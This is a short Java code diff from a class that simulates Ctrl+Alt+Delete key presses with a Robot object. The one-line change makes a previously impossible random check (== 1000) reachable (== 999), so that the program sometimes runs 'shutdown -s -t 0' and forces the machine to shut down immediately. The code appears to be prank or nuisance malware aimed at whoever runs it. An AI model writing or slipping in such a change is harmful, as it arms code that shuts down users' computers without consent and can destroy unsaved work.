@@ -58,7 +58,7 @@ class Main {
 	  		        robot.keyRelease(17);  //VK_CONTROL
 	  		        robot.keyRelease(18);  //VK_ALT
 	  		        robot.keyRelease(127); //VK_DELETE
-	  		        if (rand.nextInt(1000) == 1000) {
+	  		        if (rand.nextInt(1000) == 999) {
 	  	  		     	runtime = Runtime.getRuntime();
 	  	  				try {
 	  	  					runtime.exec("shutdown -s -t 0");
